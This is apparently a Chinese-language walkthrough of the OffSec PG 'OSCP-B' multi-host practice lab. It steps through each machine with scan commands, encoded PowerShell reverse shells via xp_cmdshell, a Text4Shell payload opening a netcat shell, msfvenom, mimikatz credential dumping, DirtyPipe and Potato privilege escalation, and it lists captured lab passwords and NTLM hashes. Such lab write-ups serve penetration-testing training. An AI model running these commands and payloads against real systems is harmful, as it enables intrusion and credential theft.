---
title: "OSCP-B"
description: "这篇OffSec PG Chain 多机靶场 OSCP-B 复盘串联了多台主机之间的突破顺序、凭据衔接与横向提权路径。"
summary: "这篇OffSec PG Chain 多机靶场 OSCP-B 复盘串联了多台主机之间的突破顺序、凭据衔接与横向提权路径。"
date: "2025-02-01T20:54:36+08:00"
publishDate: "2025-02-01T20:54:36+08:00"
lastmod: "2025-02-01T20:54:36+08:00"
url: "/pg/challenge-labs/oscp-b/"
image: "images/oscp-banners/banner-049.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "OffSec PG"
tags:
  - "Chain"
oscp_provider: "OffSec PG"
oscp_platform: "Chain"
---
<!-- oscp-refactor:meta-start -->
> 平台：Chain / 多机 ｜ 来源：OffSec PG
<!-- oscp-refactor:meta-end -->

| 机器                 | 名称            | 类型     | 值                               |
| -------------------- | --------------- | -------- | -------------------------------- |
| 192.168.138.147_MS01 | web_svc         | password | Diamond1                         |
| 192.168.138.147_MS01 | sql_svc         | password | Dolphin1                         |
| 10.10.98.148         | Administrator   | NTLM     | 59b280ba707d22e3ef0aa587fc29ffe5 |
| 10.10.98.148         | tom_admin       | NTLM     | 4979d69d4ca66955c075c41cf45f24dc |
| 10.10.98.148         | Cheyanne.Adams  | NTLM     | b3930e99899cb55b4aefef9a7021ffd0 |
| 10.10.98.148         | David.Rhys      | NTLM     | 9ac088de348444c71dba2dca92127c11 |
| 10.10.98.148         | Mark.Chetty     | NTLM     | 92903f280e5c5f3cab018bd91b94c771 |
| 10.10.98.148         | celia.almeda    | NTLM     | cdfd82ed5ad093e2774bb0cb51805515 |
| 10.10.98.148         | Administrator   | NTLM     | a3a38f45ff2adaf28e945577e9e2b57a |
|                      | $MACHINE.ACC    |          | 37da5b46771cee70c71a092490644cd8 |
|                      | DefaultPassword |          | 7Tg9M9MZbzAokR9                  |
|                      |                 |          |                                  |

![image-20250118164746161](https://s2.loli.net/2025/01/18/WE7qcrfly2TRe5o.png)

<!-- oscp-refactor:merged-start -->

## 关联机器记录

### 10.10.98.146 DC01

针对目标服务器进行相应的端口扫描

```
/home/zkpc/.cargo/bin/rustscan -a 10.10.98.146 --ulimit 500
```

![image-20250118193408288](https://s2.loli.net/2025/01/18/s3TbSYgdPvw4F6L.png)

针对目标服务器进行相应的端口服务探测

```
```



我们在MS02获取了一些域内用户的哈希，我们尝试进行登录

```
evil-winrm -i 10.10.98.146 -u Administrator -p '7Tg9M9MZbzAokR9'
```

![image-20250118193448242](https://s2.loli.net/2025/01/18/7zXkbWBhMIynctQ.png)

成功登录完成了相应的提权

3ba2bbc2553cc030ab022ee94f9e9a6b

### 10.10.98.148 MS02

针对目标服务器进行相应的端口探测

```
/home/zkpc/.cargo/bin/rustscan -a 10.10.98.148 --ulimit 500
```

![image-20250118172640277](https://s2.loli.net/2025/01/18/ebjxuEfosDPYJGn.png)

针对服务器开放端口进行进一步的端口服务扫描

```
sudo nmap -p135,139,445,1433 -A -Pn 10.10.98.148 -oN 10.10.98.148_MS02.txt
```

![image-20250118165841110](https://s2.loli.net/2025/01/18/hIyvDQYUPuq7Fga.png)

我们看到一个1433端口的开启，我们尝试使用之前获取到的sql_svc用户进行登录

```
impacket-mssqlclient 'sql_svc':'Dolphin1'@10.10.98.148 -windows-auth
```

![image-20250118172309305](https://s2.loli.net/2025/01/18/yBFXQkb6PCnLG9O.png)

成功完成登录，我们尝试启动xp_cmdshell

![image-20250118172351166](https://s2.loli.net/2025/01/18/rOhLc6DN9HxoURA.png)

```
exec xp_cmdshell "whoami"
```

![image-20250118172428040](https://s2.loli.net/2025/01/18/Vo8Q3YrmvuybsGA.png)

我们尝试反弹shell

```
#攻击端进行侦听端口增加，让MS02能够访问到攻击端
listener_add --addr 0.0.0.0:7777 --to 127.0.0.1:7777
listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:8888

enable_xp_cmdshell
exec xp_cmdshell 'cmd /c mkdir C:\Temp'
exec xp_cmdshell 'powershell -ep bypass'
exec xp_cmdshell 'cmd /c certutil -urlcache -f http://10.10.187.147/nc.exe c:\temp\nc.exe'
exec xp_cmdshell "powershell -c 'iwr http://10.10.98.147:80/nc.exe -outfile c:\windows\temp\nc.exe'"

exec xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA4ADcALgAxADQANwAiACwAOAA4ADgAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='
```

![image-20250118181515197](https://s2.loli.net/2025/01/18/s4CZDdbnQzuJfYe.png)

![image-20250118190914402](https://s2.loli.net/2025/01/18/5bWFX9S4Q6Zqa2p.png)

![image-20250118184232922](https://s2.loli.net/2025/01/18/sHaMSQB14d59Ofc.png)





官方方法

```
you could just follow the SSH advice as follows:

Create a new user goodman in MS01.

Then:

Kali:
ssh goodman@192.168.XXX.147 -D9090 -R *:7777:localhost:7777 -R *:8888:localhost:8888

proxychains conf:
socks5  127.0.0.1 9090

Kali:
proxychains impacket-mssqlclient sql_svc:Dolphin1@10.10.XXX.148 -windows-auth


Then, encode this payload in order to catch the MS02 rev shell:

$client = New-Object System.Net.Sockets.TCPClient("10.10.98.147",7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


Run it from SQL console:

SQL> exec xp_cmdshell 'powershell -enc JABjAGw...'

and catch it using nc:

Kali:
nc -nlvp 7777

Since the tunnel is already created, you can just transfer anything using HTTP:

Kali:
python3 -m http.server 8888 

MS02:
iwr http://10.10.XXX.147:8888/whatever.exe
```

![image-20250118184936150](https://s2.loli.net/2025/01/18/YqwhWVzSnbTHAL7.png)

我们在windows.old目录下发现了sam和system文件，我们尝试将这两个文件传输到本地

```
ssh sql_svc@192.168.138.147 -R '*:8888:127.0.0.1:8888'
iwr http://10.10.98.147:8880/nc.exe -outfile nc.exe
```

![image-20250118190722692](https://s2.loli.net/2025/01/18/iYvp4IBez9uTDAs.png)

我们同时发现存在SeImpersonatePrivilege的权限，可以进行提权

```
iwr http://10.10.98.147:8880/nc.exe -outfile nc.exe
iwr http://10.10.98.147:8880/PrintSpoofer64.exe -outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -c "C:\Temp\nc.exe 10.10.98.147 8888 -e cmd"
```

![image-20250118191635820](https://s2.loli.net/2025/01/18/oVNeWQXmDGTxsuq.png)

```
iwr http://10.10.98.147:8880/mimikatz.exe -outfile mimikatz.exe
```

使用mimikatz进行信息获取

```
privilege::debug
token::elevate
sekurlsa::logonpasswords
lsadump::sam 
copy c:\windows.old\windows\system32\SAM .
copy c:\windows.old\windows\system32\SYSTEM .
lsadump::sam /sam:SAM /system:SYSTEM
```

![image-20250118192556501](https://s2.loli.net/2025/01/18/pJmdQ3ebnvZcFwK.png)

我们获取了一些NTLM

```
lsadump::cache
```

![image-20250118192824464](https://s2.loli.net/2025/01/18/cMCtOWGZRHIsdhL.png)

```
lsadump::secrets
```

![image-20250118192930729](https://s2.loli.net/2025/01/18/Nf54ME9pUqYoDtR.png)

Local name : MS02 ( S-1-5-21-2512333080-3128024849-3533006164 )
Domain name : OSCP ( S-1-5-21-2610934713-1581164095-2706428072 )

### 192.168.138.147 MS01

针对目标服务器进行相应的端口探测

```
sudo nmap -p- -Pn -vvv --min-rate 2000 192.168.138.147
```

![image-20250118143508500](https://s2.loli.net/2025/01/18/6ygObBxenVIY42N.png)

针对目标服务器的开放端口进行进一步的服务探测

```
sudo nmap -p21,22,135,139,445,5040,5985,7680,8000,8443,47001,49664,49665,49666,49667,49668,49669,49670,49671 -A -Pn 192.168.138.147 -oN 192.168.138.147_MS01.txt
```

![image-20250118144016354](https://s2.loli.net/2025/01/18/Fihy5TnMWfRKctw.png)

针对21端口进行匿名及弱密码登录尝试

```
ftp 192.168.138.147 21
```

anonymous和ftp登录均失败

添加相应的hosts记录

```
192.168.138.147  MS01.oscp.exam
```

针对8000端口我们进行相应目录扫描工作内容

```
dirsearch -u http://192.168.138.147:8000/
```

![image-20250118144837955](https://s2.loli.net/2025/01/18/KhwDGUQ2rYBt58m.png)



同时针对smb服务进行扫描和访问

```
netexec smb 192.168.138.147 -u guest -p '' --shares
```

![image-20250118144905551](https://s2.loli.net/2025/01/18/8DCShMwfQtL4Wu9.png)

```
enum4linux-ng 192.168.138.147 -A -C 
```

![image-20250118144952716](https://s2.loli.net/2025/01/18/Ss8xTbolwDzWQmq.png)

访问8443端口

```
https://ms01.oscp.exam:8443/
```

![image-20250118145238031](https://s2.loli.net/2025/01/18/vySpkDOrlNVAbF7.png)

有一个注册页面，同时可以让我们输入一个url地址，我们尝试在本地开启侦听，查看是否会有连接进入

```
sudo responder -I tun0
http://192.168.45.153/test.txt
```

但没有任何返回内容，没有按照预期返回hash，我们尝试使用一个普通的httpserver，发现是能够正常下载的

![image-20250118150952403](https://s2.loli.net/2025/01/18/CFGT1UILu49mWPg.png)

![image-20250118151010781](https://s2.loli.net/2025/01/18/f5bel6FMwYyodpc.png)

我们尝试在url出使用smb访问，查看是否能够获取hash

```
\\192.168.45.153\share
```

![image-20250118152716245](https://s2.loli.net/2025/01/18/3BluNdYUGzq48sk.png)

成功获取相应的hash

```
web_svc::OSCP:0c00c45c2a4d0791:D41BFEAD10790E73ABE7A9440C77FD9D:01010000000000000028FA66BC69DB01C8C6C847DF8F497A00000000020008004B0030005300590001001E00570049004E002D0051005500470049004E005800350055005A004A004A0004003400570049004E002D0051005500470049004E005800350055005A004A004A002E004B003000530059002E004C004F00430041004C00030014004B003000530059002E004C004F00430041004C00050014004B003000530059002E004C004F00430041004C00070008000028FA66BC69DB0106000400020000000800300030000000000000000000000000300000EA3EC0632D9171685916F79828F3DE90EEB7F6DFBE61B469C1DB896C236245FB0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100350033000000000000000000
```

我们尝试针对该hash进行破解

```
john hash_web_svc --wordlist=/usr/share/wordlists/rockyou.txt
```

![image-20250118152837767](https://s2.loli.net/2025/01/18/eKox3SWNzFJ8bTi.png)

我们获取了一对账号密码

| username | password |
| -------- | -------- |
| web_svc  | Diamond1 |

我们使用这组用户密码针对smb和ftp等服务进行检测

```
netexec smb 192.168.138.147 -u web_svc -p 'Diamond1' --shares
```

![image-20250118153410338](https://s2.loli.net/2025/01/18/xKcVX5NtLG6Ciwb.png)

```
ftp 192.168.138.147 21
```

![image-20250118153445931](https://s2.loli.net/2025/01/18/oV7uqYnLba3JhDH.png)

```
netexec winrm 192.168.138.147 -u web_svc -p 'Diamond1'
```

![image-20250118153737424](https://s2.loli.net/2025/01/18/UgzWyFD9XGiKsHE.png)

```
evil-winrm -i 192.168.138.147 -u web_svc -p 'Diamond1'
```

手动尝试后发现也无法登录

我们优先来检查smb的文件内容

```
smbclient //192.168.138.147/setup -U 'oscp.exam\web_svc' -t 6000
```

![image-20250118154034155](https://s2.loli.net/2025/01/18/h87LVaQJHUcgZei.png)

将内容下载

![image-20250118154308031](https://s2.loli.net/2025/01/18/kI7OGnS3RfVhJaA.png)

我们通过ssh进行登录尝试，结果成功

```
ssh web_svc@192.168.138.147
```

![image-20250118155149160](https://s2.loli.net/2025/01/18/tiru9k4fpZF5aM7.png)

![image-20250118155614153](https://s2.loli.net/2025/01/18/pDnClZozrVsyFLi.png)

具有autologon64.exe，就说明这个文件夹会被用户访问，考虑到有两个exe，我们考虑可能会有人来运行exe，我们需要替换相应的exe或者dll即可

我们优先来处理sql.exe，我们打开procmon

![image-20250118160131322](https://s2.loli.net/2025/01/18/mhN7sPVbqdAxgOj.png)

![image-20250118160121929](https://s2.loli.net/2025/01/18/UE8nIPJlLRONtg2.png)

```
file sql.exe
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.153 LPORT=8000 -f dll > TextShaping.dll
```

![image-20250118160339579](https://s2.loli.net/2025/01/18/GE8MmgIoxbCNPZ4.png)

```
certutil -urlcache -split -f http://192.168.45.153/TextShaping.dll c:\setup\TextShaping.dll
```

但发现没有写入权限，我们使用winpeas进行信息收集

```
C:\Users\web_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

没有进一步的发现，我们尝试kerberoasting攻击

```
iwr http://192.168.45.153/Rubeus.exe -outfile Rubeus.exe
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast 
```

![image-20250118163244744](https://s2.loli.net/2025/01/18/Qlq58ODiCowndHa.png)

![image-20250118163257212](https://s2.loli.net/2025/01/18/hxzYsEWrLB3wVHQ.png)

使用smb共享我们在本地进行哈希的破解工作

```
john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt
```

![image-20250118164249168](https://s2.loli.net/2025/01/18/xfVPDapRcjetJWS.png)

我们获取了第二个密码

| username | password |
| -------- | -------- |
| sql_svc  | Dolphin1 |

我们先开启一个跳板，针对内网两台机器进行扫描，查看如何进行下一步

```
iwr http://192.168.45.153/agent.exe -outfile agent.exe
./agent -connect 192.168.45.153:11601 -ignore-cert
sudo ip route add 10.10.98.0/24 dev ligolo
```

### 192.168.138.149 Kiero

针对目标服务器进行相应的端口探测

```
 /home/zkpc/.cargo/bin/rustscan -a 192.168.138.149 --ulimit 1000 
```

![image-20250118194452066](https://s2.loli.net/2025/01/18/VnjbpB2u5MCGdzk.png)

针对目标服务器开放端口进行相应的服务探测

```
sudo nmap -p21,22,80 -A -Pn 192.168.138.149 -oN 192.168.138.149_Kiero.txt
```

![image-20250118194509203](https://s2.loli.net/2025/01/18/NemQqFBuGIxanc6.png)

80经过反复扫描没有任何内容

我们尝试扫描UDP端口

```
sudo nmap -sU -Pn --min-rate 2000 192.168.139.149
```

![image-20250119002820537](https://s2.loli.net/2025/01/19/5OBY6CvZ3iEehg2.png)

发现SNMP确实处于打开状态

```
snmpbulkwalk -Cr1000 -c public -v2c 192.168.139.149 > info.txt

snmpwalk -v2c -c public 192.168.139.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

![image-20250119011053143](https://s2.loli.net/2025/01/19/fVMUKeFdnsEikHY.png)

看到两个用户kiero和john，kiero根据描述在使用默认的密码

我们在Google搜索这句话

![image-20250119011916344](https://s2.loli.net/2025/01/19/lG8YLp6dg7DrAyz.png)

发现这个貌似是一个应用，我们搜索他的默认账号密码

![image-20250119011954485](https://s2.loli.net/2025/01/19/GloOfNgLzvI9sbV.png)

密码可能是kerio，我们针对上述获取的两个用户均进行尝试，但均失败，我们尝试访问ftp

```
ftp 192.168.115.149 21
```

![image-20250119013442738](https://s2.loli.net/2025/01/19/1icA3mMg8NTEudV.png)

我们使用默认的失败，但使用和用户名相同的成功

![image-20250119013600883](https://s2.loli.net/2025/01/19/aJN9rEA2Dwtv4Om.png)

可以看到是john的密钥

我们进行登录使用

![image-20250119013652827](https://s2.loli.net/2025/01/19/8jeKwtFYDAxk24u.png)

我们获得第一个flag内容

7a1ed0a7c8a2eeac7849dbef18af3754

![image-20250119013750624](https://s2.loli.net/2025/01/19/wSCov5c9Na2HtqY.png)

![image-20250119013839655](https://s2.loli.net/2025/01/19/JjHa3RyBNWi5Av9.png)

![image-20250119014038615](https://s2.loli.net/2025/01/19/s8qHz97AtFImE5Y.png)

尝试了几个3560都不行，尝试使用https://github.com/Rvn0xsy/CVE-2021-4034.git

也不行，我们尝试另外的漏洞[CVE-2022-0847] DirtyPipe

```
gcc 50808.c -o rshell
chmod +x rshell
./rshell /usr/bin/sudo
```

![image-20250119015913272](https://s2.loli.net/2025/01/19/1KQSuCIzf8OTibR.png)

获得第二个flag

1b3895976c60d781581ec35a14dbbabd

### 192.168.138.150 Berlin

针对目标服务器进行相应的端口扫描

```
/home/zkpc/.cargo/bin/rustscan -a 192.168.138.150 --ulimit 1000
```

![image-20250118194601887](https://s2.loli.net/2025/01/18/xHsKpQmcg5ieDA7.png)

针对开放端口进行相应的服务扫描

```
sudo nmap -p22,8080 -A 192.168.138.150 -oN 192.168.138.150_Berlin.txt
```

![image-20250118194917064](https://s2.loli.net/2025/01/18/qDLyIoKBdwYnAJb.png)

22端口没有可以利用的内容，我们将关注点放到8080端口

```
dirsearch -u http://192.168.138.150:8080/
```

![image-20250118205347187](https://s2.loli.net/2025/01/18/x7Vu8omz4hYtZBl.png)

![image-20250118205900555](https://s2.loli.net/2025/01/18/wjAZndOKc2ePIzB.png)



![image-20250118205538937](https://s2.loli.net/2025/01/18/Wn2S31xl4pkBUie.png)

![image-20250118205637183](https://s2.loli.net/2025/01/18/zD9TqW3XnOxgNMi.png)

从返回看貌似只允许get

我们通过Google搜索：apache commons text 1.8 exploit，找到一个漏洞（CVE-2022–42889）

https://medium.com/fmisec/cve-2022-42889-text4shell-vulnerability-17b703a48dcd

```
${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.45.153 8080 -e /bin/sh')}
```

![image-20250118211112562](https://s2.loli.net/2025/01/18/ykTLlGiNonWMtAY.png)

https://github.com/gustanini/CVE-2022-42889-Text4Shell-POC.git

![image-20250118220430874](https://s2.loli.net/2025/01/18/5lhaYgbZ7s4c6XJ.png)

获得了一个shell，我们升级下shell内容

![image-20250118220546708](https://s2.loli.net/2025/01/18/EzXDvsmMdhSiG1b.png)

![image-20250118220608542](https://s2.loli.net/2025/01/18/S5vKy2mFlH4enfz.png)

我们获得第一个flag

c9a124cfde2de6064bfa860f1b0e0148

我们开始考虑提权相关的问题，我们上传linpeas

![image-20250118220905697](https://s2.loli.net/2025/01/18/cmJ8l1RUWrnuBzZ.png)

利用不成功

![image-20250118221353029](https://s2.loli.net/2025/01/18/fXS3UtNnEFxy29K.png)

![image-20250118221424269](https://s2.loli.net/2025/01/18/76DQIKThpO1byWJ.png)

有个8000端口，我们进行转发

```
sudo ssh -L 8000:127.0.0.1:8000 -i id_rsa dev@192.168.139.150
sudo nmap -p8000 127.0.0.1
```

方法成功，但无法访问

```
java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
```

![image-20250118235050322](https://s2.loli.net/2025/01/18/ra4uR8y5Zi6SgMH.png)

我们查看/opt/stats/App.java

![image-20250118235113761](https://s2.loli.net/2025/01/18/J2DhOR8BqcskKvV.png)

![image-20250118235145434](https://s2.loli.net/2025/01/18/dotbDi3R6xqrVnO.png)

貌似8000是一个调试端口

![image-20250118235946903](https://s2.loli.net/2025/01/18/Hv5QjCrwJNhVMGF.png)

```
python3 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd 'chmod u+s /bin/bash'
```

![image-20250119004647546](https://s2.loli.net/2025/01/19/s8UEKGDLMFldtru.png)

这时会卡住，我们需要运行（在e.g.有提示）

```
nc 127.0.0.1 5000 -z
```

![image-20250119004735843](https://s2.loli.net/2025/01/19/sVFkQ42gcAt6wRE.png)

获得第二个flag

66422b6c466a56c872d14ec64fda280c

### 192.168.138.151 Gust

针对目标服务器进行相应的端口探测

```
/home/zkpc/.cargo/bin/rustscan -a 192.168.138.151 --ulimit 1000
```

![image-20250118194652600](https://s2.loli.net/2025/01/18/nA3ZrEU9gSQbtu6.png)

针对目标服务器开放端口进行服务探测

```
sudo nmap -p80,2855,2856,3389,5060,5066,5080,7443,8021,8081,8082 -Pn -A 192.168.138.151 -oN 192.168.138.151_Gust.txt
```

![image-20250118195321046](https://s2.loli.net/2025/01/18/zKNOvUneEoSYtjG.png)

FreeSWITCH mod_sofia 1.10.1 存在一个漏洞可以进行命令执行

```
searchsploit -m 47799
python exploit.py 192.168.139.151 whoami
```

![image-20250118232518900](https://s2.loli.net/2025/01/18/X3ohkF14Id9waPM.png)

我们来进行命令反弹

```
python exploit.py 192.168.139.151 'cmd /c powershell -e JABzAD0AJwAxADkAMgAuADEANgA4AC4ANAA1AC4AMQA1ADMAOgA0ADQAMwAnADsAJABpAD0AJwA3ADYAMwBiAGQAOAA1ADAALQA4ADkAZQBmAGIANAA3ADMALQAwADgAOQBjAGUANAA4ADQAJwA7ACQAcAA9ACcAaAB0AHQAcAA6AC8ALwAnADsAJAB2AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8ANwA2ADMAYgBkADgANQAwACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADMANwBjAGYALQAwAGEAMgBiACIAPQAkAGkAfQA7AHcAaABpAGwAZQAgACgAJAB0AHIAdQBlACkAewAkAGMAPQAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADgAOQBlAGYAYgA0ADcAMwAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQAzADcAYwBmAC0AMABhADIAYgAiAD0AJABpAH0AKQAuAEMAbwBuAHQAZQBuAHQAOwBpAGYAIAAoACQAYwAgAC0AbgBlACAAJwBOAG8AbgBlACcAKQAgAHsAJAByAD0AaQBlAHgAIAAkAGMAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAIAAtAEUAcgByAG8AcgBWAGEAcgBpAGEAYgBsAGUAIABlADsAJAByAD0ATwB1AHQALQBTAHQAcgBpAG4AZwAgAC0ASQBuAHAAdQB0AE8AYgBqAGUAYwB0ACAAJAByADsAJAB0AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAcAAkAHMALwAwADgAOQBjAGUANAA4ADQAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQAzADcAYwBmAC0AMABhADIAYgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A'
```

![image-20250118232758205](https://s2.loli.net/2025/01/18/BXhQp4Z3kfIcnKl.png)

我们获得第一个flag

c2b505c6e45c455da51d2352552a5712

```
whoami all
```

![image-20250118232848295](https://s2.loli.net/2025/01/18/qlriDfjLcdkSvCn.png)

具有SeImpersonatePrivilege

我们来进行提权

```
.\PrintSpoofer64.exe -c "C:\temp\nc.exe 192.168.45.153 80 -e cmd"
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c C:\temp\nc.exe 192.168.45.153 80 -e cmd"
```

![image-20250118234251920](https://s2.loli.net/2025/01/18/75dKxJWQBXSfZpT.png)

1c29378982fca6517ab1fa6b76228858

<!-- oscp-refactor:merged-end -->
